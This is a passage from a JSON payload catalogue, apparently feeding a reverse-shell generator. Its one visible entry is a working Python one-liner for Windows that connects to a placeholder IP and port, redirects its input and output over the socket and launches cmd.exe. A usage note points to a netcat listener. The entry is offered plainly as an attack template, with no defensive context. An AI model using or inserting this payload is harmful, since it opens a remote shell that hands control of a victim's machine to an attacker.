            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell using socket, os, and subprocess modules.",
            "template": "python -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe']);\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive"
            ]
        }
    ]
}